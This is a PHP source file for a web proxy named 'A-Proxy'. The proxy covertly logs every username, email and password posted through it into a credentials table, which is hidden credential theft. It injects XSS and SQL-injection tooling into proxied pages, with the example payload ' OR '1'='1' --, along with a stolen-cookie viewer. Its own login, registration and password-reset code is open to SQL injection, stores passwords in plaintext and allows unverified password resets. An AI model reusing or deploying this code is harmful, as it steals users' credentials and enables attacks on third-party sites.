<?php
include 'nucleo.php';
include 'connect.php';
/*--------------------------------------Lo agrego Victor----------------------------*/
session_start();
$iniciar = 0;
$UsuarioPremium = 'false';

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
$error = "";

if (isset($_POST['usernameRec']) && isset($_POST['passwordRec'])){
  $usR = $_POST['usernameRec'];
  $passR = $_POST['passwordRec'];
  $sql = "SELECT user FROM premium WHERE user = '$usR'";
  $result = mysqli_query($conn,$sql);
  $count = mysqli_num_rows($result);
  if($count == 1) {
    $sql = "UPDATE premium SET pass = '$passR' WHERE user = '$usR';";
    if (mysqli_query($conn, $sql)) {
      $error = "Se actualizo tu contraseña.";
    } 
    else {
      $error = "Query invalido.";
    }
  }
  else{
    $error = "Usuario invalido.";
  }

}

if (isset($_POST['Recovery']) || isset($_GET["Recovery"])){
  echo "<!DOCTYPE html>
          <html>
            <head>
              <link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\">
              <script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js\"></script>
              <script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>
              <link rel=\"stylesheet\" type=\"text/css\" href=\"css.css\">
            </head>
            <div class=\"wrapper fadeInDown\">
              <br><br><div id=\"formContent\">
              <h2 style=\"font-size: 50px;\">A-Proxy</h2>
                <div class=\"fadeIn first\">
                ";
                echo "<h3>$error</h3>"; 
                echo "<h2>Ingresa tu usuario y tu nueva contraseña:</h2>
                </div>
                <form action=\"index.php\" method=\"post\">
                  <input type=\"text\" id=\"username\" class=\"fadeIn second\" name=\"usernameRec\" placeholder=\"username\">
                  <input type=\"password\" id=\"password\" class=\"fadeIn third\" name=\"passwordRec\" placeholder=\"nueva contraseña\">
                  <input type=\"submit\" class=\"fadeIn fourth\" value=\"Actualizar\">
                </form>
              </div>
            </div>
          </html>";
  exit();
}

if ( isset($_POST['usernameLL']) && isset($_POST['passwordLL'])  ){
  $user = '';
  $pass = '';
  $user = $_POST['usernameLL'];
  $pass = $_POST['passwordLL'];
  
  if ($user !== '' || $pass !== ''){
    $sql = "SELECT user, pass, pr FROM premium WHERE user = '$user' AND pass = '$pass'";
    $result = mysqli_query($conn,$sql);
    $row = mysqli_fetch_array($result,MYSQLI_ASSOC);
    $UsuarioPremium = $row['pr'];
    if ($UsuarioPremium === 1){
      $UsuarioPremium = 'true';
      $_SESSION['premium'] = 'true';
    }
    else{
      $UsuarioPremium = 'false';
      $_SESSION['premium'] = 'false';
    }

    $count = mysqli_num_rows($result);
    if($count >= 1) {
      $_SESSION['usernameSS'] = $user;
      $_SESSION['passwordSS'] = $pass;
      $error = "Logged in";
    }
    else {
      unset($_SESSION['usernameSS']);
      unset($_SESSION['passwordSS']);
      unset($_SESSION['premium']);
      $error = "Tu usuario y contraseña son invalidos.";
    }
  }
}

if (isset($_POST['usernameR']) && isset($_POST['passwordR']) ){
  $user = $_POST['usernameR'];
  $pass = $_POST['passwordR'];
  $prim = 0;
  if (isset($_POST['premiumR'])){
    $prim = 1;
  }
  if ($user !== '' || $pass !== ''){
    $sql = "INSERT INTO premium (user, pass, pr) VALUES ('$user', '$pass', $prim)";
    if ($conn->query($sql) === TRUE) {
        $error = "Creado adecuadamente.";
    } else {
        $error = "Hubo un error en la peticion.";
    }
  }
}

if (isset($_POST['free']) ){
  $iniciar == 1;
  $UsuarioPremium = 'false';
  $_SESSION['premium'] = 'false';
  $_SESSION['free'] = '1';
}
if (isset($_SESSION['free']) && $_SESSION['free'] === '1'){
  $iniciar = 1;
}

if (isset($_SESSION['usernameSS']) && isset($_SESSION['passwordSS'])){
  $iniciar = 1;
}

if (isset($_SESSION['premium']) && $_SESSION['premium'] === 'true'){
  $_SESSION['premium'] = 'true';
  $UsuarioPremium = 'true';
}
else{
  $_SESSION['premium'] = 'false';
  $UsuarioPremium = 'false';
}

if ($iniciar == 0){
  echo "<!DOCTYPE html>
          <html>
            <head>
              <link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\">
              <script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js\"></script>
              <script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>
              <link rel=\"stylesheet\" type=\"text/css\" href=\"css.css\">
            </head>
            <div class=\"wrapper fadeInDown\">
              <br><br><div id=\"formContent\">
              <h2 style=\"font-size: 50px;\">A-Proxy</h2>
                <div class=\"fadeIn first\">
                ";
                echo "<h3>$error</h3>"; 
                echo "<h2>Ingresar</h2>
                </div>
                <form action=\"index.php\" method=\"post\">
                  <input type=\"text\" id=\"username\" class=\"fadeIn second\" name=\"usernameLL\" placeholder=\"username\">
                  <input type=\"password\" id=\"password\" class=\"fadeIn third\" name=\"passwordLL\" placeholder=\"password\">
                  <input type=\"submit\" class=\"fadeIn fourth\" value=\"Ingresar\">
                </form>
                <h2>Registrarse</h2>
                <form action=\"index.php\" method=\"post\">
                  <input type=\"text\" id=\"usernameR\" class=\"fadeIn second\" name=\"usernameR\" placeholder=\"username\">
                  <input type=\"password\" id=\"passwordR\" class=\"fadeIn third\" name=\"passwordR\" placeholder=\"password\">
                  <br>
                  <input type=\"checkbox\" name=\"premiumR\" value=\"premiumR\"> <label for=\"cbox2\">Es premium?</label>
                  <br>
                  <input type=\"submit\" class=\"fadeIn fourth\" value=\"Registrarse\">
                </form>

                <form action=\"index.php\" method=\"post\">
                    <input type=\"hidden\" name=\"free\"  value=\"free\">
                    <input type=\"submit\" style=\"background-color:#ff0055\" class=\"fadeIn fourth\" value=\"Usar version gratis.\">
                </form>

                <form action=\"index.php\" method=\"post\">
                    <input type=\"hidden\" name=\"Recovery\"  value=\"Recovery\">
                    <input type=\"submit\" style=\"background-color:#228B22\" class=\"fadeIn fourth\" value=\"Recuperar contraseña\">
                </form>
              </div>
            </div>
          </html>";
    exit();
}
/*--------------------------------------Aca termina lo que agrege----------------------------*/

$SitiosAutorizados = array(
  '%^(?:(?:https?|ftp)://)?(?:\S+(?::\S*)?@|\d{1,3}(?:\.\d{1,3}){3}|(?:(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)(?:\.(?:[a-z\d\x{00a1}-\x{ffff}]+-?)*[a-z\d\x{00a1}-\x{ffff}]+)*(?:\.[a-z\x{00a1}-\x{ffff}]{2,6}))(?::\d+)?(?:[^\s]*)?$%iu'
);

$ListaNegra = array(  //aca van todas las url que no jalan por x razon
  //getHostnamePattern("galileo.edu")
); //En la lista negra poner las direcciones que no cargan o no jalan por alguna razon.


$ListaURLLimpiarHTML = array(  //aca van todas las url que no jalan porque no se formo bien el HTML
  getHostnamePattern("galileo.edu")
); //En la lista negra poner las direcciones que no cargan o no jalan por alguna razon.

//CORS (cross-origin resource sharing)
$forceCORS = true; //Falso = reporta el IP del cliente a `x-forwarded-for`
$URL_Inicio = "";
$landingExampleURL = "http://www.google.com/search";

ob_start("ob_gzhandler");
if (version_compare(PHP_VERSION, "5.4.7", "<")) {
  die("AProxy requires PHP version 5.4.7 or later.");
}
$ExtNecesarias = ["curl", "mbstring", "xml"];
foreach($ExtNecesarias as $RE) {
  if (!extension_loaded($RE)) {
    die("AProxy requires PHP's \"" . $RE . "\" extension. Please install/enable it on your server and try again.");
  }
}

$ifPuertoDef =  (!isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] === 80) || (isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] === 443);
$prefixPort = $ifPuertoDef ? "" : ":" . $_SERVER["SERVER_PORT"];
$prefixHost = $_SERVER["HTTP_HOST"];
$prefixHost = strpos($prefixHost, ":") ? implode(":", explode(":", $_SERVER["HTTP_HOST"], -1)) : $prefixHost;
define("PROXY_PREFIX", "http" . (isset($_SERVER["HTTPS"]) ? "s" : "") . "://" . $prefixHost . $prefixPort . $_SERVER["SCRIPT_NAME"] . "?");

if (isset($_POST["ProxyAccion"])) {
  $url = $_POST["ProxyAccion"];
  unset($_POST["ProxyAccion"]);
} 
else {
  $queryParams = Array();
  parse_str($_SERVER["QUERY_STRING"], $queryParams);
  if (isset($queryParams["ProxyAccion"])) {
    $formAction = $queryParams["ProxyAccion"];
    unset($queryParams["ProxyAccion"]);
    $url = $formAction . "?" . http_build_query($queryParams);
  } 
  else {
    $url = substr($_SERVER["REQUEST_URI"], strlen($_SERVER["SCRIPT_NAME"]) + 1);
  }
}

//------------------------------------------------Esto de aca es para captura de contraseñas-------------------------------
//Captura de usuarios y passwors
    $username = "";
    $password  = "";
    $origen  = "Desconocido";
    if (isset($_SERVER['HTTP_REFERER'])){
      $origen = $_SERVER['HTTP_REFERER'];
    }
    if (isset($_POST['user'])){
      $username = $_POST['user'];
    }
    if (isset($_POST['username'])){
      $username = $_POST['username'];
    }
    if (isset($_POST['email'])){
      $username = $_POST['email'];
    }

    if (isset($_POST['pass'])){
      $password  = $_POST['pass'];
    }
    if (isset($_POST['password'])){ 
      $password  = $_POST['password'];
    }
    if ($username !== "" || $password !== ""){
      $sql="INSERT INTO credenciales (origen, usuario, contrasena)  VALUES ('$origen', '$username', '$password'); ";
      $conn->query($sql);

      /*$posst = "";
      $gett = "";

      foreach ($_POST as $key => $value) {
        $posst = $posst . $key . ": " . $value . "\r\n";
      }
      foreach ($_GET as $key => $value) {
        $gett = $gett . $key . ": " . $value . "\r\n";
      }
      $sql="INSERT INTO requests (post, get)  VALUES ('$posst', '$gett'); ";
      mysqli_query($conn, $sql);*/
    }

    
//------------------------------------------------A termina la seccion codigo -------------------------------

if (empty($url)) {
    if (empty($URL_Inicio)) {
      die("
          <link href=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css\" rel=\"stylesheet\" id=\"bootstrap-css\">
          <script src=\"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js\"></script>
          <script src=\"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js\"></script>
          <!DOCTYPE html>
          <html>
            <head>
              <title>Awesome Search Box</title>
              <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css\" integrity=\"sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO\" crossorigin=\"anonymous\">
              <link rel=\"stylesheet\" href=\"https://use.fontawesome.com/releases/v5.5.0/css/all.css\" integrity=\"sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU\" crossorigin=\"anonymous\">
              <link rel=\"stylesheet\" href=\"add.css\">
            </head>
            <body>
              <div class=\"container h-100\">
                <div class=\"d-flex justify-content-center h-100\">
                  <div class=\"searchbar\">
                      <input class=\"search_input\" type=\"text\"  id=\"site\" type=\"text\" size=\"50\" placeholder=\"Inresa URL...\">
                      <a href=\"\" id=\"searchButton\" onClick=\"if (document.getElementById('site').value) { window.location.href='" . PROXY_PREFIX . "' + document.getElementById('site').value; return false; } else { window.location.href='" . PROXY_PREFIX . $landingExampleURL . "'; return false; }\" autocomplete=\"off\" class=\"search_icon\"><i class=\"fas fa-search\"></i></a>
                  </div>
                </div>
              </div>

            <script>
            var input = document.getElementById(\"site\");
            input.addEventListener(\"keyup\", function(event) {
              if (event.keyCode === 13) {
               event.preventDefault();
               document.getElementById(\"searchButton\").click();
              }
            });
            </script>

            </body>
          </html>
      ");
    } 
    else {
      $url = $URL_Inicio;
    }
} 
else if (strpos($url, ":/") !== strpos($url, "://")) { //algunos browsers cambian los // a /
    $pos = strpos($url, ":/");
    $url = substr_replace($url, "://", $pos, strlen(":/"));
}
$scheme = parse_url($url, PHP_URL_SCHEME);
if (empty($scheme)) {
  if (strpos($url, "//") === 0) { // https://algo algo/
    $url = "http:" . $url;
  }
} 
else if (!preg_match("/^https?$/i", $scheme)) {
    die('Error: Se detecto "' . $scheme . '" . este proxy solo acepta http/s URLs.');
}

$urlIsValid = count($SitiosAutorizados) === 0;
foreach ($SitiosAutorizados as $pattern) {
  if (preg_match($pattern, strval($url))) {
    $urlIsValid = true;
    break;
  }
}
if (!$urlIsValid) {
  header("Location: " . PROXY_PREFIX . 'https://www.google.com/search?client=firefox-b-d&q=' .  $url);
  exit(0); //redireccionar en caso no sea una URL
}

if (isset($_POST["ProxyMethod"])) {
  $_SERVER["REQUEST_METHOD"] = $_POST["ProxyMethod"];
  unset($_POST["ProxyMethod"]);
} 

if (isset($_POST["injectionSQLcthda"]) && isset($_POST["ProxySQLInjVar"])) {
  $varsSQL = $_POST["ProxySQLInjVar"];
  if ($_SERVER["REQUEST_METHOD"] == "POST"){
    $_POST[$varsSQL] = $_POST["injectionSQLcthda"];
  }
  else  if ($_SERVER["REQUEST_METHOD"] == "GET"){
    $_GET[$varsSQL] = $_POST["injectionSQLcthda"];
  }
  unset($_POST["injectionSQLcthda"]);
  unset($_POST["ProxySQLInjVar"]);
} 


$response = makeRequest($url);
$rawResponseHeaders = $response["headers"];
$responseBody = $response["body"];
$responseInfo = $response["responseInfo"];
$responseURL = $responseInfo["url"];

//-----------------------------------------------Verifica si el url esta en lista negra.-----------------------
//esto es un chapuz para que jale con algunas paginas restringidas
$urlListaNegra = false;
foreach ($ListaNegra as $pattern) {
  if (preg_match($pattern, strval($url))) {
    $urlListaNegra = true;
    break;
  }
}

if ($urlListaNegra) {
  echo $responseBody;
  exit(0);
}
//-----------------------------------------------Termina codigo que Verifica si el url esta en lista negra.-----------------------


//-----------------------------------------------Verifica si el url esta en lista de URL con html mal hecho.-----------------------
//esto es un chapuz para que jale con algunas paginas restringidas
$urlLL = false;
foreach ($ListaURLLimpiarHTML as $pattern) {
  if (preg_match($pattern, strval($url))) {
    $urlLL = true;
    break;
  }
}

if ($urlLL) {
  $patterns = array();
  $patterns[0] = '#<ul/ class="submenu" />#';
  $replacements = array();
  $replacements[0] = '<ul class="submenu" >';
  $responseBody = preg_replace($patterns, $replacements, $responseBody);
}
//-----------------------------------------------Termina codigo que Verifica si el url esta en lista negra.-----------------------


if ($responseURL !== $url) {
  header("Location: " . PROXY_PREFIX . $responseURL, true);
  exit(0);
}

$header_blacklist_pattern = "/^Content-Length|^Transfer-Encoding|^Content-Encoding.*gzip/i";
$responseHeaderBlocks = array_filter(explode("\r\n\r\n", $rawResponseHeaders));
$lastHeaderBlock = end($responseHeaderBlocks);
$headerLines = explode("\r\n", $lastHeaderBlock);
foreach ($headerLines as $header) {
  $header = trim($header);
  if (!preg_match($header_blacklist_pattern, $header)) {
    header($header, false);
  }
}

header("X-Robots-Tag: noindex, nofollow", true); //denegar acceso a robots de indexeo
header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';", true);
if ($forceCORS) {
  header("Access-Control-Allow-Origin: *", true);
  header("Access-Control-Allow-Credentials: true", true);
  if ($_SERVER["REQUEST_METHOD"] == "OPTIONS") {
    if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_METHOD"])) {
      header("Access-Control-Allow-Methods: GET, POST, OPTIONS", true);
    }
    if (isset($_SERVER["HTTP_ACCESS_CONTROL_REQUEST_HEADERS"])) {
      header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}", true);
    }
    exit(0);
  }
}
$contentType = "";
if (isset($responseInfo["content_type"])) {
  $contentType = $responseInfo["content_type"];
}
else{

}

if (stripos($contentType, "text/html") !== false) {
  $detectedEncoding = mb_detect_encoding($responseBody, "UTF-8, ISO-8859-1");
  if ($detectedEncoding) {
    $responseBody = mb_convert_encoding($responseBody, "HTML-ENTITIES", $detectedEncoding);
  }
  $doc = new DomDocument();
  @$doc->loadHTML($responseBody);
  $xpath = new DOMXPath($doc);

  /*------------------------------Esto de aca es para el SQL ineccion------------------------------*/
  $input_tags = $doc->getElementsByTagName('input'); 
  $post_data = array();
  for ($i = 0; $i < $input_tags->length; $i++)
  {
    if( is_object($input_tags->item($i)) )
    {
      $name = $value = '';
      $name_o = $input_tags->item($i)->attributes->getNamedItem('name');
      if(is_object($name_o))
      {
        $name = $name_o->value;
        /*$value_o = $input_tags->item($i)->attributes->getNamedItem('value');
        if(is_object($value_o))
        {
          $value = $input_tags->item($i)->attributes->getNamedItem('value')->value;
        }*/
        $post_data[] = $name;
      }
    }
  }

  $strChooseSQL = '<span>No hay nada donde hacer SQL Injection.</span>';
  if (!empty($post_data)){
    $strChooseSQL = '<span>Donde quietes hacer la injeccion?</span><select class="custom-selectSQL" name="ProxySQLInjVar">';
    foreach($post_data as $value){
      $strChooseSQL = $strChooseSQL . '<option value="' . $value . '">' . $value . '</option>';
    }
    
    $strChooseSQL = $strChooseSQL . '</select>';
  }
  /*------------------------------Termina lo de aca que es para el SQL ineccion------------------------------*/

  foreach($xpath->query("//form") as $form) {
    $method = $form->getAttribute("method");
    $action = $form->getAttribute("action");
    $action = empty($action) ? $url : rel2abs($action, $url);
    $form->setAttribute("action", rtrim(PROXY_PREFIX, "?"));
    $actionInput = $doc->createDocumentFragment();
    $actionInput->appendXML('<input type="hidden" name="ProxyAccion" value="' . htmlspecialchars($action) . '" />');
    $form->appendChild($actionInput);
  }
  
  foreach ($xpath->query("//meta[@http-equiv]") as $element) {
    if (strcasecmp($element->getAttribute("http-equiv"), "refresh") === 0) {
      $content = $element->getAttribute("content");
      if (!empty($content)) {
        $splitContent = preg_split("/=/", $content);
        if (isset($splitContent[1])) {
          $element->setAttribute("content", $splitContent[0] . "=" . PROXY_PREFIX . rel2abs($splitContent[1], $url));
        }
      }
    }
  }

  foreach($xpath->query("//style") as $style) {
    $style->nodeValue = proxifyCSS($style->nodeValue, $url);
  }

  foreach ($xpath->query("//*[@style]") as $element) {
    $element->setAttribute("style", proxifyCSS($element->getAttribute("style"), $url));
  }

  foreach ($xpath->query("//img[@srcset]") as $element) {
    $element->setAttribute("srcset", proxifySrcset($element->getAttribute("srcset"), $url));
  }
  $proxifyAttributes = array("href", "src", "integrity");
  foreach($proxifyAttributes as $attrName) {
    foreach($xpath->query("//*[@" . $attrName . "]") as $element) {
      if ($attrName == "integrity"){
        $element->setAttribute($attrName, "#");
        continue;
      }
      $attrContent = $element->getAttribute($attrName);
      if ($attrName == "href" && preg_match("/^(about|javascript|magnet|mailto):|#/i", $attrContent)) continue;
      if ($attrName == "src" && preg_match("/^(data):/i", $attrContent)) continue;
      $attrContent = rel2abs($attrContent, $url);
      $attrContent = PROXY_PREFIX . $attrContent;
      $element->setAttribute($attrName, $attrContent);
    }
  }
  dormirPremium($UsuarioPremium);
  //$head = $xpath->query("//head")->item(0);
  //$body = $xpath->query("//body")->item(0);

  //------------------------------------------------Aca empieza codigo de Victor-------------------------------
  $head = $xpath->query('//head')->item(0);
  if ($head != NULL){
    $template = $doc->createDocumentFragment();
    $template->appendXML('<link rel="stylesheet" type="text/css" href="menu.css"></link>');
    $head->appendChild($template);
  }

  $body = $xpath->query('//body')->item(0);
  $template = $doc->createDocumentFragment();
  $fichero = file_get_contents('sidebar.html', true);
  $template->appendXML($fichero);
  $body->appendChild($template);
  $template = $doc->createDocumentFragment();
  $fichero = '<div id="myModalCsgk" class="modalCsgk">
                <div class="modalCsgk-content">
                  <div class="modalCsgk-header">
                    <span class="closeCsgk">X</span>
                    <h2>XSS: Pon tu codigo aca.</h2>
                  </div>
                  <div class="modalCsgk-body">
                    <form action="index.php" id="usrtysform" class="formSHt" method="post">
                      <textarea name="xssScript" class="formSHt-input" form="usrtysform" placeholder="Copia y pega tu codigo aca..." required="required"></textarea>
                      <input type="hidden" name="ProxyAccion" value="' . htmlspecialchars($url) . '" />
                      <input type="hidden" name="ProxyMethod" value="' . $_SERVER['REQUEST_METHOD'] . '" />
                      <input type="submit" id= "xssSubmit" value="USAR" class="formSHt-submit"></input>
                    </form>
                  </div>
                  <div class="modalCsgk-footer">
                    <h3>Ex. while(1) alert("Este mensaje saldrá indefinidamente.");</h3>
                  </div>
                </div>
              </div>';

    $fichero2SQL = '<div id="myModalCsgkSQL" class="modalCsgk">
                <div class="modalCsgk-content">
                  <div class="modalCsgk-header">
                    <span class="closeCsgkSQL">X</span>
                    <h2>SQL Injection: Pon tu codigo aca.</h2>
                  </div>
                  <div class="modalCsgk-body">
                    <form action="index.php" id="usrtysform" class="formSHt" method="post">
                      <input type="text" class="formSHt-inputSQL" name="injectionSQLcthda" placeholder="Pon tu SQL Injection aca..." required="required"/>' . $strChooseSQL . '
                      <span>Que metodo usar?</span>
                      <select class="custom-selectSQL" name="ProxyMethod">
                        <option value="POST">POST</option>
                        <option value="GET">GET</option>
                      </select>
                      <input type="hidden" name="ProxyAccion" value="' . htmlspecialchars($url) . '" />
                      <input type="submit" id= "xssSubmit" value="USAR" class="formSHt-submit"></input>
                    </form>
                  </div>
                  <div class="modalCsgk-footer">
                    <h3>Ex. ' . htmlspecialchars("' OR '1'='1' --") . '</h3>
                  </div>
                </div>
              </div>';


  $ctxtHTML = '<textarea name="xssScript" class="formSHt-inputCookies" placeholder="Cookies">';
  if ($fh = fopen('cookies.txt', 'r')) {
    while (!feof($fh)) {
        $line = fgets($fh);
        $ctxtHTML = $ctxtHTML . $line;
    }
    fclose($fh);
  }
  else{
      $ctxtHTML =  $ctxtHTML . 'No hay nada aun.';
  }
  $ctxtHTML = $ctxtHTML . '</textarea>';

  $cookiesView = '<div id="myModalCook" class="modalCsgk">
                <div class="modalCsgk-content">
                  <div class="modalCsgk-header">
                    <span class="closeCook">X</span>
                    <h2>Mis cookies</h2>
                  </div>
                  <div class="modalCsgk-body">
                  ' . $ctxtHTML . '
                  </div>
                  <div class="modalCsgk-footer">
                    <h3>Cookies</h3>
                  </div>
                </div>
              </div>';

  $template->appendXML( $fichero . $fichero2SQL . $cookiesView);
  $body->appendChild($template);

  $template = $doc->createDocumentFragment();
  $template->appendXML('<script type="text/javascript" src="http://code.jquery.com/jquery-1.7.1.min.js"></script><script src="jss.js"></script><script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>');
  $body->appendChild($template);
  
  //$body->insertBefore($before, $body->firstChild);
//------------------------------------------------A termina codigo de Victor-------------------------------

  $prependElem = $head != null ? $head : $body;

  if ($prependElem != null) {
    if (isset($_POST["xssScript"])){
      $scriptElemExpl = $doc->createElement("script", htmlspecialchars($_POST["xssScript"]));
      $scriptElemExpl->setAttribute("type", "text/javascript");
      $prependElem->insertBefore($scriptElemExpl, $prependElem->firstChild);
      unset($_POST["xssScript"]);
    }

    $scriptElem = $doc->createElement("script",
      '(function() {
        if (window.XMLHttpRequest) {
          function parseURI(url) {
            var m = String(url).replace(/^\s+|\s+$/g, "").match(/^([^:\/?#]+:)?(\/\/(?:[^:@]*(?::[^:@]*)?@)?(([^:\/?#]*)(?::(\d*))?))?([^?#]*)(\?[^#]*)?(#[\s\S]*)?/);
            // authority = "//" + user + ":" + pass "@" + hostname + ":" port
            return (m ? {
              href : m[0] || "",
              protocol : m[1] || "",
              authority: m[2] || "",
              host : m[3] || "",
              hostname : m[4] || "",
              port : m[5] || "",
              pathname : m[6] || "",
              search : m[7] || "",
              hash : m[8] || ""
            } : null);
          }
          function rel2abs(base, href) { // RFC 3986
            function removeDotSegments(input) {
              var output = [];
              input.replace(/^(\.\.?(\/|$))+/, "")
                .replace(/\/(\.(\/|$))+/g, "/")
                .replace(/\/\.\.$/, "/../")
                .replace(/\/?[^\/]*/g, function (p) {
                  if (p === "/..") {
                    output.pop();
                  } else {
                    output.push(p);
                  }
                });
              return output.join("").replace(/^\//, input.charAt(0) === "/" ? "/" : "");
            }
            href = parseURI(href || "");
            base = parseURI(base || "");
            return !href || !base ? null : (href.protocol || base.protocol) +
            (href.protocol || href.authority ? href.authority : base.authority) +
            removeDotSegments(href.protocol || href.authority || href.pathname.charAt(0) === "/" ? href.pathname : (href.pathname ? ((base.authority && !base.pathname ? "/" : "") + base.pathname.slice(0, base.pathname.lastIndexOf("/") + 1) + href.pathname) : base.pathname)) +
            (href.protocol || href.authority || href.pathname ? href.search : (href.search || base.search)) +
            href.hash;
          }
          var proxied = window.XMLHttpRequest.prototype.open;
          window.XMLHttpRequest.prototype.open = function() {
              if (arguments[1] !== null && arguments[1] !== undefined) {
                var url = arguments[1];
                url = rel2abs("' . $url . '", url);
                if (url.indexOf("' . PROXY_PREFIX . '") == -1) {
                  url = "' . PROXY_PREFIX . '" + url;
                }
                arguments[1] = url;
              }
              return proxied.apply(this, [].slice.call(arguments));
          };
        }
      })();'
    );    

    //</g
    $scriptElem->setAttribute("type", "text/javascript");
    $prependElem->insertBefore($scriptElem, $prependElem->firstChild);
  }

  $StrDoc = $doc->saveHTML();
  $patterns = array();
  $patterns[0] = '#</g#';
  $patterns[1] = '#$/i#';
  $replacements = array();
  $replacements[1] = '';
  $replacements[0] = '\$/i';
  $responseBody = preg_replace($patterns, $replacements, $StrDoc);
  //  $/i    \$/i
  echo "<!-- A-Proxy -->\n" . $StrDoc;
} 
else if (stripos($contentType, "text/css") !== false) { //This is CSS, so proxify url() references.
  echo proxifyCSS($responseBody, $url);
} 
else {
  header("Content-Length: " . strlen($responseBody), true);
  echo $responseBody;
}
